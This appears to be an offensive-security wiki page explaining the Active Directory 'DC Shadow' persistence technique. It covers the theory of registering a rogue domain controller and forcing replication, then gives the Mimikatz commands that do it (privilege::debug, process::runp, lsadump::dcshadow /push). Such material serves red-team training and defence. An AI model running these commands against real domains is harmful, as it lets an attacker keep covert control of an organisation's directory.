# DC Shadow

## Theory

The idea behind this persistence technique is to have an attacker-controlled machine act as a domain controller (shadow DC) to push changes onto the domain by forcing other domain controllers to replicate.

There are two requirements for a machine to act as a domain controller:

1. Be registered as a DC in the domain**: this is done by;
   1. modifying the computer's SPN (`ServicePrincipalName`) to `GC/$HOSTNAME.$DOMAIN/$DOMAIN`
   2. adding an entry like `CN=$HOSTNAME,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=$DOMAIN` with the following attribute values:
      * `objectClass: server`
      * `dNSHostName: $HOSTNAME.$DOMAIN`
      * `serverReference: CN=$HOSTNAME,CN=Computers,DC=$DOMAIN`
2. Be able to request and/or respond to specific RPC calls: `DRSBind`, `DRSUnbind`, `DRSCrackNames,` `DRSAddEntry`, `DRSReplicaAdd`, `DRSReplicaDel`, `DRSGetNCChanges`.

Below is the attack workflow (step 1 & 2 can be switched if need be):

1. Register the workstation that will act as the shadow DC
    1. add the required entry in `CN=Configuration`
    2. modify the workstation's SPN
2. Prepare the changes to be pushed onto the domain (with calls to `DRSAddEntry`)
3. Push the changes by forcing another legitimate DC to replicate from the workstation with a `DRSReplicaAdd` call, which automatically makes a `DRSGetNCChanges` call from the legitimate DC to the shadow DC.
4. Unregister the workstation so it is not longer considered to be a DC (by a `DRSReplicaDel` call and by reverting changes made to `CN=Configuration` and the workstation's SPN).

It is important to note that this technique can be used as a "meta" one, in the sense that it permits to use other persistence techniques, such as [SID history](../sid-history.md) , [Delegation to KRBTGT](../kerberos/delegation-to-krbtgt.md) and even [DACL abuse](../dacl).

For instance, a DC Shadow attack can be conducted to register a controlled workstation as a domain controller, and then use that to push changes to the domain that would expose it to DACL abuse.

## Practice

::: tabs

=== UNIX-like

> [!CAUTION]
> _July 27th 2023_ : There is currently no way to exploit this technique purely from a distant UNIX-like machine, as it requires some tools that have yet to be made.


=== Windows

DC Shadow can be performed by using Mimikatz. It works in every 64-bits Windows Server version up to 2022 (included). Everything happens on the workstation that will act as the shadow DC.

Two Mimikatz shells are required:

* one with domain admin privileges (called the trigger shell from now on)
* one as `NT-AUTHORITY\SYSTEM` (called the RPC shell from now on)

### Preparing shells


```
# In a mimikatz shell, launched with DA rights
# This will be the trigger shell
privilege::debug

# The following command will open a new mimikatz shell as NT-AUTHORITY\SYSTEM
# This will be the RPC shell
process::runp

# On both shell, run the following command to confirm permissions
# On the trigger shell, it will return the domain admin account name (used to lauch the first mimikatz shell)
# On the RPC shell, it will return NT-AUTHORITY\SYSTEM
token::whoami
```


### Preparing changes to push


```
# (RPC shell)
lsadump::dcshadow /object:ObjectToModify /attribute:AttributeToModifyOnTargetedObject /value:NewValueOfTargetedAttribute
```


### Pushing changes


```
# (Trigger shell)
# The command below will register the shadow DC, push the changes, and unregister
lsadump::dcshadow /push
```
